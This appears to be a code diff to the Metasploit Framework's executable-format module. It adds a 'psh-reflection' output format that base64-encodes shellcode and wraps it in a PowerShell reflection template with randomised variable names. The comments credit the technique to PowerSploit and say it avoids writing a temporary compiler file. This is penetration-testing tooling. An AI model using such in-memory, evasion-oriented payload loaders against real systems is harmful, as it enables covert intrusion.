@@ -782,7 +782,7 @@ require 'msf/core/exe/segment_injector'
     return read_replace_script_template("to_exe.vba.template", hash_sub)
   end
 
-def self.to_vba(framework,code,opts={})
+  def self.to_vba(framework,code,opts={})
     hash_sub = {}
     hash_sub[:var_myByte]		  = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
     hash_sub[:var_myArray]		  = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
@@ -918,6 +918,33 @@ def self.to_vba(framework,code,opts={})
     hash_sub[:shellcode] = Rex::Text.to_powershell(code, hash_sub[:var_code])
 
     return read_replace_script_template("to_mem_old.ps1.template", hash_sub).gsub(/(?<!\r)\n/, "\r\n")
+  end
+
+  #
+  # Reflection technique prevents the temporary .cs file being created for the .NET compiler
+  # Tweaked by shellster
+  # Originally from PowerSploit
+  #
+  def self.to_win32pe_psh_reflection(framework, code, opts={})
+    # Intialize rig and value names
+    rig = Rex::RandomIdentifierGenerator.new()
+    rig.init_var(:func_get_proc_address)
+    rig.init_var(:func_get_delegate_type)
+    rig.init_var(:var_code)
+    rig.init_var(:var_module)
+    rig.init_var(:var_procedure)
+    rig.init_var(:var_unsafe_native_methods)
+    rig.init_var(:var_parameters)
+    rig.init_var(:var_return_type)
+    rig.init_var(:var_type_builder)
+    rig.init_var(:var_buffer)
+    rig.init_var(:var_hthread)
+
+    hash_sub = rig.to_h
+
+    hash_sub[:b64shellcode] = Rex::Text.encode_base64(code)
+
+    return read_replace_script_template("to_mem_pshreflection.ps1.template", hash_sub).gsub(/(?<!\r)\n/, "\r\n")
   end
 
   def self.to_win32pe_vbs(framework, code, opts={})
@@ -1712,6 +1739,9 @@ def self.to_vba(framework,code,opts={})
 
     when 'psh-net'
       output = Msf::Util::EXE.to_win32pe_psh_net(framework, code, exeopts)
+      
+    when 'psh-reflection'
+      output = Msf::Util::EXE.to_win32pe_psh_reflection(framework, code, exeopts)
 
     end
 
@@ -1735,6 +1765,7 @@ def self.to_vba(framework,code,opts={})
       "msi-nouac",
       "psh",
       "psh-net",
+      "psh-reflection",
       "vba",
       "vba-exe",
       "vbs",
